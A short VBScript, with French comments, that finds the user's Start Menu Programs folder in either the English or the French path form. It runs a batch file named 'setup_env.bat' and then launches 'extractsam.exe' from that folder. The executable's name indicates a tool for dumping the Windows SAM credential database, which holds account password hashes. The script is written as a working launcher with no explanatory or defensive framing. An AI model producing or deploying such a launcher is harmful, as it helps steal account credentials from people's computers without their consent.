Set objShell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")

' Définir les deux chemins potentiels
startup_en = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Start Menu\Programs")
startup_fr = objShell.ExpandEnvironmentStrings("%APPDATA%\Microsoft\Windows\Menu Démarrer\Programmes")

' Choisir le bon chemin selon la langue
If fso.FolderExists(startup_en) Then
    startupPath = startup_en
ElseIf fso.FolderExists(startup_fr) Then
    startupPath = startup_fr
Else
    WScript.Quit
End If


' Lancer setup_env.bat et attendre la fin
objShell.Run "cmd.exe /c """ & startupPath & "\setup_env.bat""", 1, True


' Lancer extractsam.exe
objShell.Run "cmd.exe /c """ & startupPath & "\extractsam.exe""", 1, False
